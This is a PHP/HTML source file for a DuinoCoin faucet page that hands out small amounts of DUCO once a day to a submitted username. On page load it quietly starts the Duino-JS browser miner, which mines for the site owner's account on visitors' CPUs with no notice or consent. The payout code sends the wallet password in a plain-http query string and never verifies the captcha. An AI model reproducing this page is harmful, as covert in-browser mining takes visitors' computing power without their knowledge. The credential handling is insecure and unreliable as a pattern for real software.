<!DOCTYPE html>
<html>
<head>
    <title>faucet</title>
    <script src="https://hcaptcha.com/1/api.js" async defer></script>
    <link rel="stylesheet" type="text/css" href="styles.css">
    <script src="duino-js.min.js"></script> <!--imports the Duino-JS miner-->
<script>
    username = `tinyfaucet`; //put your username here (e.g. revox, ericddm, snehaislove or Hoiboy19), the default is Hoiboy19.
    rigid = `.net website`; //If you want to change the rig ID, you can change this. If you want to keep using "Duino-JS", you can remove this line.
    threads = userThreads; //Set the amount of threads to use here, check out https://github.com/sys-256/Duino-JS for more options. The default is 1.
    startMiner(); //starts the miner
</script>
</head>
<body>
    <?php
    // Specify your DuinoCoin wallet address and password
    $wallet_address = 'USERNAME';
    $wallet_password = 'PASSWORD';

    // Specify the minimum and maximum payout amount in Duco
    $min_payout = 0.1;
    $max_payout = 1;

    // Connect to the time.php file
    require_once 'time.php';

    // Check if the form has been submitted
    if(isset($_POST['duco_address'])) {
        // Secure the form data to prevent injection attacks
        $duco_address = filter_input(INPUT_POST, 'duco_address', FILTER_SANITIZE_FULL_SPECIAL_CHARS);
        $ip_address = $_SERVER['REMOTE_ADDR'];
        
        // Check if this user has already claimed today
        $result = check_last_claim($duco_address, $ip_address);
        if($result['claimed']) {
            $time_left = gmdate('H:i:s', $result['time_left']);
            $message = 'You have already claimed today. Please try again in '.$time_left.'!';
        } else {
            // If the user hasn't claimed, send the funds and log the claim time
            // Call the DuinoCoin API to send the funds to the user's address
            $api_url = 'http://server.duinocoin.com/';
            $send_url = $api_url.'transaction/';
            $amount = rand($min_payout * 100, $max_payout * 100) / 100;
            $send_data = array(
                'username' => $wallet_address,
                'password' => $wallet_password,
                'recipient' => $duco_address,
                'amount' => $amount,
                'memo' => 'TinyFaucet | PythonScratcher'
            );
            $send_result = file_get_contents($send_url.'?'.http_build_query($send_data));
            if($send_result === false || $send_result == '') {
                $message = 'Failed to contact the DuinoCoin API. Please try again later.';
            } else {
                if(strpos($send_result, 'success') !== false) {
                    $message = 'Successfully sent '.$amount.' Duco to '.$duco_address.'!';
                    
                    // Log the claim time to prevent users from making multiple claims per day
                    log_claim_time($duco_address, $ip_address);
                }
            }
        }
    }
    ?>
    <div id="form-div">
    <h1>faucet</h1>
    <?php if(isset($message)) { echo '<p>'.$message.'</p>'; } ?>
    <p>You can claim <?php echo $min_payout ?> - <?php echo $max_payout ?> DUCO every 24 hours</p>
    <form method="post" action="<?php echo htmlentities($_SERVER['PHP_SELF']); ?>">
        <label for="duco_address">DuinoCoin Username:</label>
        <input type="text" name="duco_address" id="duco_address" required>
        <div class="h-captcha" data-sitekey="KEYHERE"></div>
        <input type="submit" value="Claim Now">
    </form>
</div>

<footer>
    <p>&copy; 2023 PythonScratcher</p>
</footer>
